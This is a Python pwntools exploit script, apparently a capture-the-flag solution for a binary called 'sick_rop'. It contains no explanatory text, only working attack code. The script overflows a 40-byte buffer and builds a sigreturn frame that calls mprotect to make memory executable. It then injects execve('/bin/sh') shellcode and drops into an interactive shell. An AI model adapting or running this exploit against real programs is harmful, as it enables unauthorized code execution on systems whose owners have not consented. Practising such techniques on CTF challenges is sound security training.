#!/usr/bin/python3
from pwn import process, SigreturnFrame, p64

shell = process("./sick_rop")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x40102e) # vuln()
payload += p64(0x401014) # syscall; ret;

frame = SigreturnFrame(arch="amd64")
frame.rax = 0xa      # mprotect()
frame.rdi = 0x400000 # .data
frame.rsi = 0x1001   # len
frame.rdx = 0x7      # prot
frame.rsp = 0x4010d8 # &vuln()
frame.rip = 0x401014 # syscall; ret;

payload += bytes(frame)

shell.send(payload)
shell.recv()

payload  = b""
payload += b"A" * 0xf # len = sigreturn()

shell.send(payload)
shell.recv()

# execve("/bin/sh", NULL, NULL);
shellcode = b"\x6a\x3b\x58\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x99\x0f\x05"

payload  = b""
payload += shellcode
payload += b"A" * (offset - len(shellcode))
payload += p64(0x4010b8) # addr to shellcode

shell.send(payload)
shell.recv()

shell.interactive()
